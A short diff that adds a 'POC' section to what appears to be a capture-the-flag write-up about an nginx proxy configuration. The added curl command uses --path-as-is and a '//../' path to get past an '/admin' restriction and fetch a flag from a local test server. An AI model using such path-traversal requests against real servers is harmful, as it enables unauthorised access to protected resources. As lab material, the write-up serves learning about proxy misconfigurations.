@@ -25,3 +25,8 @@ location / {
     proxy_pass	http://backend;
 }
 ```
+
+### POC
+``` bash
+curl --path-as-is 'http://127.0.0.1:8083/admin//../flag'
+```
